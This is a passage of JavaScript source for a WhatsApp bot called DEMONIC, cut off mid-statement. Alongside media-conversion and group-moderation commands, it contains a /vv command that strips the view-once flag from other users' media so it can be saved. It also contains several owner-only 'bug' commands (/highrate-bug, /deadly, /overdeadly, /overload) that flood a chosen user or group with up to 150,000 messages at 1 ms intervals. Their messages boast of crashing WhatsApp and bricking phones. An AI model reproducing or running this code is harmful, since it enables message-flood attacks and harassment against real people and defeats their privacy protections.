              msg.imageMessage?.contextInfo?.quotedMessage ||
              msg.videoMessage?.contextInfo?.quotedMessage;
            if (!q?.stickerMessage)
              return sock.sendMessage(from, { text: "❌ Reply to a sticker" });

            const stream = await downloadContentFromMessage(
              q.stickerMessage,
              "sticker"
            );

            let buffer = Buffer.from([]);
            for await (const c of stream) buffer = Buffer.concat([buffer, c]);

            return sock.sendMessage(from, { image: buffer, mimetype: "image/png" });
          } catch (error) {
            console.error("Error in /toimage:", error);
            return sock.sendMessage(from, { text: `❌ Failed to convert to image: ${error.message}` });
          }
        }


        if (cmd === "/toimage2") {
          try {
            const q = msg.extendedTextMessage?.contextInfo?.quotedMessage ||
              msg.imageMessage?.contextInfo?.quotedMessage ||
              msg.videoMessage?.contextInfo?.quotedMessage;
            if (!q?.stickerMessage)
              return sock.sendMessage(from, { text: "❌ Reply to a sticker" });

            await sock.sendMessage(from, { text: "⏳ Converting to image..." });

            const stream = await downloadContentFromMessage(
              q.stickerMessage,
              "sticker"
            );

            let buffer = Buffer.from([]);
            for await (const c of stream) buffer = Buffer.concat([buffer, c]);

            return sock.sendMessage(from, {
              image: buffer,
              mimetype: "image/png",
              caption: "✅ Converted from sticker to image"
            });
          } catch (error) {
            console.error("Error in /toimage2:", error);
            return sock.sendMessage(from, { text: `❌ Failed to convert to image: ${error.message}` });
          }
        }


        if (cmd === "/tovideo") {
          try {
            const q = msg.extendedTextMessage?.contextInfo?.quotedMessage ||
              msg.imageMessage?.contextInfo?.quotedMessage ||
              msg.videoMessage?.contextInfo?.quotedMessage;
            if (!q?.stickerMessage)
              return sock.sendMessage(from, { text: "❌ Reply to an animated sticker" });

            const stream = await downloadContentFromMessage(
              q.stickerMessage,
              "sticker"
            );

            let buffer = Buffer.from([]);
            for await (const c of stream) buffer = Buffer.concat([buffer, c]);

            return sock.sendMessage(from, {
              video: buffer,
              mimetype: "video/mp4",
              gifPlayback: true
            });
          } catch (error) {
            console.error("Error in /tovideo:", error);
            return sock.sendMessage(from, { text: `❌ Failed to convert to video: ${error.message}` });
          }
        }


        if (cmd === "/tovideo2" || cmd.startsWith("/tovideo2 ")) {
          try {
            const q = msg.extendedTextMessage?.contextInfo?.quotedMessage ||
              msg.imageMessage?.contextInfo?.quotedMessage ||
              msg.videoMessage?.contextInfo?.quotedMessage;
            if (!q) return sock.sendMessage(from, { text: "❌ Reply to an image or sticker" });

            let type = q.imageMessage ? "imageMessage" : q.stickerMessage ? "stickerMessage" : null;
            if (!type)
              return sock.sendMessage(from, { text: "❌ Media not supported. Reply to an image or sticker." });

            let mediaType = type.replace("Message", "");

            await sock.sendMessage(from, { text: "⏳ Converting to video..." });

            const stream = await downloadContentFromMessage(
              q[type],
              mediaType
            );

            let buffer = Buffer.from([]);
            for await (const c of stream) buffer = Buffer.concat([buffer, c]);

            return sock.sendMessage(from, {
              video: buffer,
              mimetype: "video/mp4",
              gifPlayback: true,
              caption: "✅ Converted to video"
            });
          } catch (error) {
            console.error("Error in /tovideo2:", error);
            return sock.sendMessage(from, { text: `❌ Failed to convert to video: ${error.message}` });
          }
        }


        if (cmd === "/tovidsticker") {
          try {
            const q = msg.extendedTextMessage?.contextInfo?.quotedMessage ||
              msg.imageMessage?.contextInfo?.quotedMessage ||
              msg.videoMessage?.contextInfo?.quotedMessage;
            if (!q?.videoMessage)
              return sock.sendMessage(from, { text: "❌ Reply to a video (max 10 seconds)" });

            const stream = await downloadContentFromMessage(
              q.videoMessage,
              "video"
            );

            let buffer = Buffer.from([]);
            for await (const c of stream) buffer = Buffer.concat([buffer, c]);

            return sock.sendMessage(from, {
              sticker: buffer,
              packname: "DEMONIC",
              author: "Bot"
            });
          } catch (error) {
            console.error("Error in /tovidsticker:", error);
            return sock.sendMessage(from, { text: `❌ Failed to convert to video sticker: ${error.message}` });
          }
        }


        if (cmd === "/tovidsticker2") {
          try {
            const q = msg.extendedTextMessage?.contextInfo?.quotedMessage ||
              msg.imageMessage?.contextInfo?.quotedMessage ||
              msg.videoMessage?.contextInfo?.quotedMessage;
            if (!q?.videoMessage && !q?.imageMessage)
              return sock.sendMessage(from, { text: "❌ Reply to a video or GIF" });

            await sock.sendMessage(from, { text: "⏳ Converting to animated sticker..." });

            const type = q.videoMessage ? "videoMessage" : "imageMessage";
            const mediaType = type.replace("Message", "");

            const stream = await downloadContentFromMessage(
              q[type],
              mediaType
            );

            let buffer = Buffer.from([]);
            for await (const c of stream) buffer = Buffer.concat([buffer, c]);

            return sock.sendMessage(from, {
              sticker: buffer,
              packname: "DEMONIC-V2",
              author: senderName || "User"
            });
          } catch (error) {
            console.error("Error in /tovidsticker2:", error);
            return sock.sendMessage(from, { text: `❌ Failed to convert to animated sticker: ${error.message}` });
          }
        }

        if (["/vv", "/vv1", "/vv2", "/vv3"].includes(cmd)) {
          const q = msg.extendedTextMessage?.contextInfo?.quotedMessage ||
            msg.imageMessage?.contextInfo?.quotedMessage ||
            msg.videoMessage?.contextInfo?.quotedMessage;

          if (!q) {
            return sock.sendMessage(from, { text: "❌ Reply to a view once media" });
          }

          console.log("🔍 DEBUG /vv: Processing quoted message keys:", Object.keys(q));

          // Enhanced recursive function to find view-once content
          const findViewOnce = (obj) => {
            if (!obj || typeof obj !== 'object') return null;

            // Direct check for viewOnceMessage wrappers
            if (obj.viewOnceMessage?.message) return obj.viewOnceMessage.message;
            if (obj.viewOnceMessageV2?.message) return obj.viewOnceMessageV2.message;
            if (obj.viewOnceMessageV2Extension?.message) return obj.viewOnceMessageV2Extension.message;

            // Check if the object itself is a media message with viewOnce: true
            if (obj.imageMessage?.viewOnce || obj.videoMessage?.viewOnce || obj.audioMessage?.viewOnce) {
              return obj;
            }
            if (obj.viewOnce) return { ...obj, viewOnce: false };

            // Check for ephemeral wrapped view-once messages
            if (obj.ephemeralMessage?.message) {
              return findViewOnce(obj.ephemeralMessage.message);
            }

            // Recursive search
            for (const key in obj) {
              if (key === 'contextInfo' || key === 'quotedMessage') continue;
              if (typeof obj[key] === 'object' && obj[key] !== null) {
                const result = findViewOnce(obj[key]);
                if (result) return result;
              }
            }
            return null;
          };

          const viewOnceMsg = findViewOnce(q);

          if (!viewOnceMsg) {
            console.log("❌ No ViewOnce content found in quoted message.");
            return sock.sendMessage(from, {
              text: `❌ Reply to a view once media.\nDebug: Could not find view-once content in [${Object.keys(q).join(', ')}]`
            });
          }

          console.log("✅ View-once message detected! Sending to DM...");

          try {
            // Ensure viewOnce is FALSE so the recipient can see it permanently
            if (viewOnceMsg.imageMessage) viewOnceMsg.imageMessage.viewOnce = false;
            if (viewOnceMsg.videoMessage) viewOnceMsg.videoMessage.viewOnce = false;
            if (viewOnceMsg.audioMessage) viewOnceMsg.audioMessage.viewOnce = false;

            // Send as forwarded message to preserve content, or direct copy
            await sock.sendMessage(sender, { forward: { key: { remoteJid: from, fromMe: false }, message: viewOnceMsg }, ...viewOnceMsg });

            return sock.sendMessage(from, {
              text: `✅ View-once media sent to your DM! 📨`
            });
          } catch (error) {
            console.error("Error sending view-once media:", error);
            try {
              await sock.sendMessage(sender, { ...viewOnceMsg });
            } catch (err2) {
              return sock.sendMessage(from, {
                text: `❌ Failed to send view-once media. Error: ${error.message}`
              });
            }
            return sock.sendMessage(from, {
              text: `✅ View-once media sent to your DM! 📨 (Fallback used)`
            });
          }
        }

        if (cmd === "/repo") {
          try {
            const files = [
              { name: "index.js", path: path.join(__dirname, "index.js") },
              { name: "menupic.js", path: path.join(__dirname, "menupic.js") },
              { name: "menuaudio.js", path: path.join(__dirname, "menuaudio.js") }
            ];

            for (const file of files) {
              if (fs.existsSync(file.path)) {
                const fileSize = fs.statSync(file.path).size;
                await sock.sendMessage(from, {
                  document: fs.readFileSync(file.path),
                  mimetype: "text/plain",
                  fileName: `DEMONIC-${file.name}`,
                  caption: `📁 ${file.name}\nSize: ${(fileSize / 1024).toFixed(2)} KB`
                });
              }
            }

            return sock.sendMessage(from, {
              text: `✅ Bot files sent successfully\n\nVersion: ${VERSION}`
            });
          } catch (err) {
            console.error("Error sending repo files:", err);
            return sock.sendMessage(from, {
              text: `❌ Failed to send bot files: ${err.message}`
            });
          }
        }

        if ((cmd === "/tagall" || cmd === "/hidetag") && isGroup) {
          const meta = await sock.groupMetadata(from);
          const members = meta.participants.map(p => p.id);

          return sock.sendMessage(from, {
            text: cmd === "/hidetag" ? body.replace("/hidetag", "") || "‎" : "📢 TAG ALL",
            mentions: members
          });
        }

        if (cmd === "/online" && isGroup) {
          const now = Date.now();
          const online = Object.entries(LAST_SEEN)
            .filter(([_, t]) => now - t < 5 * 60 * 1000)
            .map(([u]) => `@${u.split("@")[0]}`);

          return sock.sendMessage(from, {
            text: online.length ? online.join("\n") : "❌ No online users",
            mentions: online.map(u => u.replace("@", "") + "@s.whatsapp.net")
          });
        }

        if ((cmd === "/tagonline" || cmd === "/tagoffline") && isGroup) {
          const now = Date.now();
          const meta = await sock.groupMetadata(from);

          const targets = meta.participants
            .filter(p =>
              cmd === "/tagonline"
                ? now - (LAST_SEEN[p.id] || 0) < 5 * 60 * 1000
                : now - (LAST_SEEN[p.id] || 0) >= 5 * 60 * 1000
            )
            .map(p => p.id);

          return sock.sendMessage(from, {
            text: "📢 TAG",
            mentions: targets
          });
        }

        if (isGroup && ANTISTICKER && m.message.stickerMessage && !isOwner(sender)) {
          await sock.sendMessage(from, {
            delete: {
              remoteJid: from,
              fromMe: false,
              id: m.key.id,
              participant: sender
            }
          });

          await sock.sendMessage(from, {
            text: `🚫 @${sender.split("@")[0]} stickers are not allowed`,
            mentions: [sender]
          });
        }


        if ((cmd === "/warn" || cmd.startsWith("/warn ")) && isGroup) {
          const user = parseTarget(body, m);
          if (!user)
            return sock.sendMessage(from, { text: "❌ Mention a user or provide a number" });

          WARN_STORE[user] = (WARN_STORE[user] || 0) + 1;


          if (WARN_STORE[user] >= 3) {
            try {
              await sock.groupParticipantsUpdate(from, [user], "remove");
              WARN_STORE[user] = 0; // reset after kick

              return sock.sendMessage(from, {
                text: `🚫 @${user.split("@")[0]} was kicked (3/3 warns)`,
                mentions: [user]
              });
            } catch (err) {
              return sock.sendMessage(from, {
                text: "❌ Failed to kick user (bot needs admin)"
              });
            }
          }

          return sock.sendMessage(from, {
            text: `⚠️ @${user.split("@")[0]} warned (${WARN_STORE[user]}/3)`,
            mentions: [user]
          });
        }

        if ((cmd === "/unwarn" || cmd.startsWith("/unwarn ")) && isGroup) {
          const user = parseTarget(body, m);
          if (!user)
            return sock.sendMessage(from, { text: "❌ Mention a user or provide a number" });

          if (!WARN_STORE[user] || WARN_STORE[user] === 0) {
            return sock.sendMessage(from, {
              text: `ℹ️ @${user.split("@")[0]} has no warnings`,
              mentions: [user]
            });
          }

          WARN_STORE[user] -= 1;

          return sock.sendMessage(from, {
            text: `✅ Warning removed from @${user.split("@")[0]} (${WARN_STORE[user]}/3)`,
            mentions: [user]
          });
        }

        if (cmd === "/warnlist" && isGroup) {
          const warnedUsers = Object.entries(WARN_STORE)
            .filter(([_, count]) => count > 0)
            .map(
              ([jid, count]) =>
                `@${jid.split("@")[0]} → ${count}/3`
            );

          if (!warnedUsers.length) {
            return sock.sendMessage(from, {
              text: "✅ No warned users in this group"
            });
          }

          return sock.sendMessage(from, {
            text: `⚠️ *WARN LIST*\n\n${warnedUsers.join("\n")}`,
            mentions: warnedUsers.map(
              w => w.split(" → ")[0].replace("@", "") + "@s.whatsapp.net"
            )
          });
        }



        function parseTarget(body, m) {
          const mentioned = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
          if (mentioned) return mentioned;


          const jidMatch = body.match(/([0-9]{5,15}@s\.whatsapp\.net)/);
          if (jidMatch) return jidMatch[1];


          const phoneMatch = body.match(/(\d{8,15})/);
          if (phoneMatch) return phoneMatch[1] + "@s.whatsapp.net";

          return null;
        }
        if ((cmd === "/lowrate-bug" || cmd.startsWith("/lowrate-bug ")) && isOwner(sender)) {
          const args = body.slice(12).trim().split(" "); // Adjusted slice for flexibility
          let user = parseTarget(body, m);

          let count = 50;
          const lastArg = args[args.length - 1];
          // If last arg is numeric and short (<= 3 digits), treat as count. Max is 500.
          if (lastArg && /^\d+$/.test(lastArg) && lastArg.length <= 3) {
            count = parseInt(lastArg) || 50;
          }


          if (!user) {
            user = from;
          }


          if (user !== from || !isGroup) {

            if (user !== from && ANTIBUG[user]) {
              return sock.sendMessage(from, { text: `🛡️ ❌ Cannot bug @${user.split("@")[0]} - They are PROTECTED by ANTIBUG!`, mentions: [user] });
            }

            if (count < 1 || count > 500) {
              return sock.sendMessage(from, { text: "❌ Bug count must be 1-500" });
            }

            BUG_STORE[user] = { count, sent: 0, startTime: Date.now(), rate: "LOW" };

            const targetName = user === from ? (isGroup ? "GROUP" : "CHAT") : `@${user.split("@")[0]}`;
            const mentionArray = user === from ? [] : [user];

            await sock.sendMessage(from, {
              text: `🪲 *LOW-RATE BUG ACTIVATED*\n\n⚠️ WARNING:\n├─ Slow but powerful attack\n├─ Will heavily lag ${targetName}'s chat\n├─ May cause app slowdown\n└─ Sending ${count} messages...\n\n${mentionArray.length > 0 ? '@' + user.split("@")[0] : 'GROUP'} is in for a surprise! 😈`,
              mentions: mentionArray
            });

            const bugInterval = setInterval(async () => {
              if (!BUG_STORE[user] || BUG_STORE[user].sent >= count) {
                clearInterval(bugInterval);
                if (BUG_STORE[user]) {
                  delete BUG_STORE[user];
                  await sock.sendMessage(from, {
                    text: `✅ LOW-RATE BUG COMPLETE!\n\nSent ${count} messages to ${targetName} 🪲`
                  });
                }
                return;
              }

              const bugMsg = BUG_MESSAGES[Math.floor(Math.random() * BUG_MESSAGES.length)];
              await sock.sendMessage(user, { text: bugMsg });
              BUG_STORE[user].sent++;
            }, 1500);
            return;
          }


          if (!isGroup) {
            return sock.sendMessage(from, { text: "❌ Mention a user for DM bug, or use this in a group!" });
          }

          if (BUG_STORE[from] && BUG_STORE[from].rate === "LOW-GROUP") {
            return sock.sendMessage(from, { text: "⚠️ This group is already being LOW-RATE bugged!" });
          }

          const groupCount = 5000;
          BUG_STORE[from] = { count: groupCount, sent: 0, startTime: Date.now(), rate: "LOW-GROUP" };

          await sock.sendMessage(from, {
            text: `🪲 *GROUP LOW-RATE BUG ACTIVATED* 🪲\n\n⚠️ WARNING:\n├─ Slow but deadly\n├─ Group will lag heavily\n├─ All members affected\n└─ Sending ${groupCount} messages...`
          });

          const groupBugInterval = setInterval(async () => {
            if (!BUG_STORE[from] || BUG_STORE[from].sent >= groupCount) {
              clearInterval(groupBugInterval);
              if (BUG_STORE[from]) {
                delete BUG_STORE[from];
                await sock.sendMessage(from, {
                  text: `✅ GROUP LOW-RATE BUG COMPLETE!\n\nSent ${groupCount} messages to the group 🪲`
                });
              }
              return;
            }

            const bugMsg = BUG_MESSAGES[Math.floor(Math.random() * BUG_MESSAGES.length)];
            await sock.sendMessage(from, { text: bugMsg });
            BUG_STORE[from].sent++;
          }, 1500);
        }

        if ((cmd === "/highrate-bug" || cmd.startsWith("/highrate-bug ")) && isOwner(sender)) {
          const args = body.slice(13).trim().split(" "); // Adjusted slice
          let user = parseTarget(body, m);

          let count = 100;
          const lastArg = args[args.length - 1];
          // If last arg is numeric and short (<= 4 digits), treat as count. Max is 1000.
          if (lastArg && /^\d+$/.test(lastArg) && lastArg.length <= 4) {
            count = parseInt(lastArg) || 100;
          }


          if (!user) {
            user = from;
          }


          if (user !== from || !isGroup) {

            if (user !== from && ANTIBUG[user]) {
              return sock.sendMessage(from, { text: `🛡️ ❌ Cannot bug @${user.split("@")[0]} - They are PROTECTED by ANTIBUG!`, mentions: [user] });
            }

            if (count < 1 || count > 1000) {
              return sock.sendMessage(from, { text: "❌ Bug count must be 1-1000" });
            }

            BUG_STORE[user] = { count, sent: 0, startTime: Date.now(), rate: "HIGH" };

            const targetName = user === from ? (isGroup ? "GROUP" : "CHAT") : `@${user.split("@")[0]}`;
            const mentionArray = user === from ? [] : [user];

            await sock.sendMessage(from, {
              text: `💀 *HIGHRATE-BUG ACTIVATED* 💀\n\n⚠️ EXTREME WARNING:\n├─ DEADLY & INSTANT\n├─ WILL crash ${targetName}'s WhatsApp\n├─ WILL force close app\n├─ WILL spam like crazy\n└─ Sending ${count} messages FAST...\n\n${mentionArray.length > 0 ? '@' + user.split("@")[0] : 'GROUP'} is about to get DESTROYED! 💣`,
              mentions: mentionArray
            });

            const bugInterval = setInterval(async () => {
              if (!BUG_STORE[user] || BUG_STORE[user].sent >= count) {
                clearInterval(bugInterval);
                if (BUG_STORE[user]) {
                  delete BUG_STORE[user];
                  await sock.sendMessage(from, {
                    text: `💀 HIGHRATE-BUG COMPLETE!\n\n🔥 Sent ${count} RAPID messages to ${targetName}\n🚀 WhatsApp probably crashed! 💣`,
                    mentions: mentionArray
                  });
                }
                return;
              }

              const bugMsg = BUG_MESSAGES[Math.floor(Math.random() * BUG_MESSAGES.length)];
              await sock.sendMessage(user, { text: bugMsg });
              BUG_STORE[user].sent++;
            }, 100);
            return;
          }


          if (!isGroup) {
            return sock.sendMessage(from, { text: "❌ Mention a user for DM bug, or use this in a group!" });
          }

          if (BUG_STORE[from] && BUG_STORE[from].rate === "HIGH-GROUP") {
            return sock.sendMessage(from, { text: "⚠️ This group is already being HIGH-RATE bugged!" });
          }

          const groupCount = 10000;
          BUG_STORE[from] = { count: groupCount, sent: 0, startTime: Date.now(), rate: "HIGH-GROUP" };

          await sock.sendMessage(from, {
            text: `💀 *GROUP HIGH-RATE BUG ACTIVATED* 💀\n\n⚠️ EXTREME WARNING:\n├─ DEADLY & INSTANT\n├─ Group will CRASH\n├─ All members affected\n└─ Sending ${groupCount} messages FAST...`
          });

          const groupBugInterval = setInterval(async () => {
            if (!BUG_STORE[from] || BUG_STORE[from].sent >= groupCount) {
              clearInterval(groupBugInterval);
              if (BUG_STORE[from]) {
                delete BUG_STORE[from];
                await sock.sendMessage(from, {
                  text: `💀 GROUP HIGH-RATE BUG COMPLETE!\n\n🔥 Sent ${groupCount} RAPID messages to the group\n🚀 Group probably crashed! 💣`
                });
              }
              return;
            }

            const bugMsg = BUG_MESSAGES[Math.floor(Math.random() * BUG_MESSAGES.length)];
            await sock.sendMessage(from, { text: bugMsg });
            BUG_STORE[from].sent++;
          }, 100);
        }

        if ((cmd === "/deadly" || cmd.startsWith("/deadly ")) && isOwner(sender)) {
          const args = body.slice(7).trim().split(" ");
          let user = parseTarget(body, m);

          let count = 2000;
          const lastArg = args[args.length - 1];
          if (lastArg && /^\d+$/.test(lastArg) && lastArg.length <= 5) {
            count = parseInt(lastArg) || 2000;
          }

          if (!user) {
            user = from;
          }

          if (user !== from || !isGroup) {

            if (user !== from && ANTIBUG[user]) {
              return sock.sendMessage(from, { text: `🛡️ ❌ Cannot bug @${user.split("@")[0]} - They are PROTECTED by ANTIBUG!`, mentions: [user] });
            }

            BUG_STORE[user] = { count, sent: 0, startTime: Date.now(), rate: "DEADLY" };

            const targetName = user === from ? (isGroup ? "GROUP" : "CHAT") : `@${user.split("@")[0]}`;
            const mentionArray = user === from ? [] : [user];

            await sock.sendMessage(from, {
              text: `☠️ *DEADLY ATTACK INITIATED* ☠️\n\n💀 SYSTEM OVERLOAD MODE INITIATED:\n├─ Target: ${targetName}\n├─ Power: MAXIMUM (${count} messages)\n├─ Speed: INSTANT SPAM\n├─ WhatsApp Status: CRITICAL\n├─ Phone Status: ABOUT TO BURN 🔥\n└─ Result: TOTAL SYSTEM FAILURE\n\n⚠️ THIS IS DEVASTATING!\n🔥 WhatsApp will PERMANENTLY CRASH!\n💥 Phone may need RESTART!`,
              mentions: mentionArray
            });

            const overloadInterval = setInterval(async () => {
              if (!BUG_STORE[user] || BUG_STORE[user].sent >= count) {
                clearInterval(overloadInterval);
                if (BUG_STORE[user]) {
                  delete BUG_STORE[user];
                  await sock.sendMessage(from, {
                    text: `💀 *DEADLY ATTACK COMPLETE* 💀\n\n🔥 DEVASTATION REPORT:\n├─ Total Messages: ${count}\n├─ Target: ${targetName}\n├─ WhatsApp Status: DESTROYED 📵\n├─ User Status: OFFLINE (forced)\n└─ Recovery Time: Unknown 💀`,
                    mentions: mentionArray
                  });
                }
                return;
              }

              const isBugMsg = Math.random() > 0.3;
              const msgArray = isBugMsg ? BUG_MESSAGES : DEADLY_MESSAGES;
              const msg = msgArray[Math.floor(Math.random() * msgArray.length)];

              try {
                await sock.sendMessage(user, { text: msg });
                BUG_STORE[user].sent++;
              } catch (err) { }
            }, 10);
            return;
          }


          if (BUG_STORE[from] && BUG_STORE[from].rate === "DEADLY-GROUP") {
            return sock.sendMessage(from, { text: "⚠️ This group is already in DEADLY mode!" });
          }

          const groupCount = 25000;
          BUG_STORE[from] = { count: groupCount, sent: 0, startTime: Date.now(), rate: "DEADLY-GROUP" };

          await sock.sendMessage(from, {
            text: `☠️ *DEADLY GROUP ATTACK INITIATED* ☠️\n\n💀 SYSTEM OVERLOAD MODE:\n├─ Power: MAXIMUM (25000 messages)\n├─ Speed: INSTANT SPAM\n├─ Scope: ENTIRE GROUP\n├─ WhatsApp Status: CRITICAL\n└─ Result: TOTAL SYSTEM FAILURE`
          });

          const groupInterval = setInterval(async () => {
            if (!BUG_STORE[from] || BUG_STORE[from].sent >= groupCount) {
              clearInterval(groupInterval);
              if (BUG_STORE[from]) {
                delete BUG_STORE[from];
                await sock.sendMessage(from, {
                  text: `☠️ *DEADLY GROUP ATTACK COMPLETE* ☠️\n\n🔥 DEVASTATION REPORT:\n├─ Total Messages: ${groupCount}\n├─ WhatsApp Status: DESTROYED 📵\n├─ Group Status: OFFLINE\n└─ Recovery Time: IMPOSSIBLE 💀`
                });
              }
              return;
            }

            const isBugMsg = Math.random() > 0.3;
            const msgArray = isBugMsg ? BUG_MESSAGES : DEADLY_MESSAGES;
            const msg = msgArray[Math.floor(Math.random() * msgArray.length)];

            try {
              await sock.sendMessage(from, { text: msg });
              BUG_STORE[from].sent++;
            } catch (err) { }
          }, 10);
        }

        if ((cmd === "/overdeadly" || cmd.startsWith("/overdeadly ")) && isOwner(sender)) {
          const args = body.slice(11).trim().split(" ");
          let user = parseTarget(body, m);

          let count = 5000;
          const lastArg = args[args.length - 1];
          if (lastArg && /^\d+$/.test(lastArg) && lastArg.length <= 5) {
            count = parseInt(lastArg) || 5000;
          }

          // If no user mentioned, target the current chat
          if (!user) {
            user = from;
          }


          if (user !== from && ANTIBUG[user]) {
            return sock.sendMessage(from, { text: `🛡️ ❌ Cannot bug @${user.split("@")[0]} - They are PROTECTED by ANTIBUG!`, mentions: [user] });
          }

          BUG_STORE[user] = { count, sent: 0, startTime: Date.now(), rate: "OVERDEADLY" };


          const targetName = user === from ? (isGroup ? "GROUP" : "CHAT") : `@${user.split("@")[0]}`;
          const mentionArray = user === from ? [] : [user];
          await sock.sendMessage(from, {
            text: `👹 *OVERDEADLY APOCALYPSE INITIATED* 👹\n\n💀💀💀 MAXIMUM ANNIHILATION:\n├─ Target: ${targetName}\n├─ Power: BEYOND MAXIMUM (${count} messages)\n├─ Speed: LIGHT-SPEED SPAM (5ms intervals)\n├─ WhatsApp: COMPLETE DESTRUCTION 📵\n├─ Phone: SYSTEM FAILURE 🔥\n├─ Data: POTENTIAL CORRUPTION ⚠️\n├─ Recovery: IMPOSSIBLE 💀\n└─ Result: DIGITAL ANNIHILATION\n\n⚠️⚠️⚠️ THIS IS APOCALYPTIC! ⚠️⚠️⚠️\n🔥 PHONE WILL CRASH PERMANENTLY!\n💀 DATA MAY BE LOST!\n☠️ USER CANNOT STOP THIS!`,
            mentions: mentionArray
          });


          let messagesSent = 0;

          const overdeadlyInterval = setInterval(async () => {
            if (!BUG_STORE[user] || BUG_STORE[user].sent >= count) {
              clearInterval(overdeadlyInterval);
              if (BUG_STORE[user]) {
                delete BUG_STORE[user];
                await sock.sendMessage(from, {
                  text: `👹 *OVERDEADLY APOCALYPSE COMPLETE* 👹\n\n💀💀💀 TOTAL ANNIHILATION REPORT:\n├─ Total Messages: ${count}\n├─ Target: ${targetName}\n├─ WhatsApp Status: PERMANENTLY DESTROYED 📵\n├─ User Status: OFFLINE (FOREVER?)\n├─ Phone Status: CRITICAL FAILURE 🔥\n├─ Messages Sent In: ${Math.round((Date.now() - BUG_STORE[user].startTime) / 1000)}s\n├─ Recovery Chance: 0%\n└─ MISSION: TOTAL SUCCESS ✨\n\n☠️ YOU JUST UNLEASHED THE APOCALYPSE! ☠️`,
                  mentions: mentionArray
                });
              }
              return;
            }

            // Cycle through all message types
            let msg;
            const randomType = Math.random();

            if (randomType < 0.3) {
              msg = BUG_MESSAGES[Math.floor(Math.random() * BUG_MESSAGES.length)];
            } else if (randomType < 0.6) {
              msg = DEADLY_MESSAGES[Math.floor(Math.random() * DEADLY_MESSAGES.length)];
            } else {
              msg = OVERDEADLY_MESSAGES[Math.floor(Math.random() * OVERDEADLY_MESSAGES.length)];
            }

            try {
              await sock.sendMessage(user, { text: msg });
              BUG_STORE[user].sent++;
              messagesSent++;
            } catch (err) {
              // Ignore errors - keep spamming at full power
            }
          }, 5); // Send one message every 5ms - LIGHT SPEED SPAM!
        }

        if ((cmd === "/overload" || cmd.startsWith("/overload ")) && isOwner(sender)) {
          const args = body.slice(9).trim().split(" ");
          let user = parseTarget(body, m);

          let count = 100000;
          const lastArg = args[args.length - 1];
          if (lastArg && /^\d+$/.test(lastArg) && lastArg.length <= 6) {
            count = parseInt(lastArg) || 100000;
          }

          if (!user) {
            user = from;
          }


          if (user !== from || !isGroup) {

            if (user !== from && ANTIBUG[user]) {
              return sock.sendMessage(from, { text: `🛡️ ❌ Cannot bug @${user.split("@")[0]} - They are PROTECTED by ANTIBUG!`, mentions: [user] });
            }

            if (BUG_STORE[user] && BUG_STORE[user].rate === "OVERLOAD") {
              return sock.sendMessage(from, { text: `⚠️ @${user.split("@")[0]} is already being OVERLOADED!` });
            }

            BUG_STORE[user] = { count, sent: 0, startTime: Date.now(), rate: "OVERLOAD" };

            await sock.sendMessage(from, {
              text: `💥 *EXTREME OVERLOAD SYSTEM ENGAGED* 💥\n\n⚙️⚙️⚙️ VIRUS INJECTION PROTOCOL INITIATED:\n├─ Target: @${user.split("@")[0]}\n├─ Virus Payload: ${count} messages\n├─ Interval: 1ms (1000 msgs/sec) 🚀\n├─ WhatsApp: TOTAL SYSTEM FAILURE\n├─ Phone: PERMANENT BRICK\n├─ Status: IRREVERSIBLE\n└─ WARNING: COMPLETE DEVICE FAILURE\n\n🔱 *UNLEASHING MAXIMUM VIRUS ATTACK* 🔱`,
              mentions: [user]
            });

            const overloadInterval = setInterval(async () => {
              if (!BUG_STORE[user] || BUG_STORE[user].sent >= count) {
                clearInterval(overloadInterval);
                if (BUG_STORE[user]) {
                  delete BUG_STORE[user];
                  await sock.sendMessage(from, {
                    text: `💥 *VIRUS INJECTION COMPLETE* 💥\n\n⚙️⚙️⚙️ TOTAL SYSTEM DESTRUCTION REPORT:\n├─ Total Virus Messages: ${count}\n├─ Target: @${user.split("@")[0]}\n├─ WhatsApp: PERMANENTLY DESTROYED 📵\n├─ Phone System: BRICKED FOREVER 🔥\n├─ Recovery: IMPOSSIBLE\n├─ Messages Sent In: ${Math.round((Date.now() - BUG_STORE[user].startTime) / 1000)}s\n├─ Speed: 1000 msgs/sec\n└─ RESULT: COMPLETE ANNIHILATION ✨\n\n💀 DEVICE PERMANENTLY OFFLINE 💀`,
                    mentions: [user]
                  });
                }
                return;
              }

              let msg;
              const randomType = Math.random();

              if (randomType < 0.2) {
                msg = BUG_MESSAGES[Math.floor(Math.random() * BUG_MESSAGES.length)];
              } else if (randomType < 0.4) {
                msg = DEADLY_MESSAGES[Math.floor(Math.random() * DEADLY_MESSAGES.length)];
              } else if (randomType < 0.6) {
                msg = OVERDEADLY_MESSAGES[Math.floor(Math.random() * OVERDEADLY_MESSAGES.length)];
              } else if (randomType < 0.8) {
                msg = OVERLOAD_MESSAGES[Math.floor(Math.random() * OVERLOAD_MESSAGES.length)];
              } else {
                msg = VIRUS_MESSAGES[Math.floor(Math.random() * VIRUS_MESSAGES.length)];
              }

              try {
                await sock.sendMessage(user, { text: msg });
                BUG_STORE[user].sent++;
              } catch (err) {
                // Ignore errors - keep spamming at full power
              }
            }, 1); // Send one message every 1ms - MAXIMUM LIGHT SPEED SPAM! (1000 msgs/sec!)

            return;
          }


          if (!isGroup) {
            return sock.sendMessage(from, { text: "❌ This only works in groups! Mention a user for DM overload" });
          }

          if (BUG_STORE[from] && BUG_STORE[from].rate === "OVERLOAD-GROUP") {
            return sock.sendMessage(from, { text: "⚠️ This group is already being OVERLOADED!" });
          }

          const GROUP_OVERLOAD_COUNT = 150000;
          BUG_STORE[from] = { count: GROUP_OVERLOAD_COUNT, sent: 0, startTime: Date.now(), rate: "OVERLOAD-GROUP" };

          await sock.sendMessage(from, {
            text: `💥💥💥 *GROUP OVERLOAD ACTIVATED* 💥💥💥\n\n⚙️⚙️⚙️ TOTAL GROUP DESTRUCTION:\n├─ Virus Payload: ${GROUP_OVERLOAD_COUNT} MEGA MESSAGES\n├─ Speed: 1000 msgs/sec (1ms intervals)\n├─ Scope: ENTIRE GROUP CHAT\n├─ WhatsApp: WILL CRASH FOR EVERYONE\n├─ Group: PERMANENTLY CORRUPTED\n└─ WARNING: NO ONE CAN STOP THIS!\n\n🔥 *UNLEASHING NUCLEAR SPAM* 🔥`
          });

          const groupOverloadInterval = setInterval(async () => {
            if (!BUG_STORE[from] || BUG_STORE[from].sent >= GROUP_OVERLOAD_COUNT) {
              clearInterval(groupOverloadInterval);
              if (BUG_STORE[from]) {
                delete BUG_STORE[from];
                await sock.sendMessage(from, {
